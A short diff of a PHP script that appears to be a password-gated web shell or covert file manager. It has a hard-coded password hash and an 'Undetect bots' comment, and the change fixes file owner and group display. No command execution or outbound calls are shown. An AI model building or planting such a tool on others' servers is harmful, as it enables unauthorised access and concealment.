@@ -1,6 +1,6 @@
 <?php
 session_start();
-define('APP_VER', '0.8');
+define('APP_VER', '0.7');
 $password = defined('PW') ? PW : '5c5fa09440696b310b4b1750d49f84ca';
 
 // Undetect bots
@@ -172,7 +172,7 @@ foreach($files as $f){
     $u = function_exists('posix_getpwuid') ? (posix_getpwuid($stat['uid'])['name'] ?? '?') : '?';
     $g = function_exists('posix_getgrgid') ? (posix_getgrgid($stat['gid'])['name'] ?? '?') : '?';
     $perm= substr(sprintf('%o', $stat['mode']), -3);
-    $item=['name'=>$f,'mtime'=>$stat['mtime'],'owner'=>$owner.':'.$group,'perm'=>$perm];
+    $item=['name'=>$f,'mtime'=>$stat['mtime'],'owner'=>$u.':'.$g,'perm'=>$perm];
     if(is_dir($fp)){ $folders[]=$item; }else{ $item['size'] = getSize($stat['size']); $regular_files[]=$item;}
 }
 
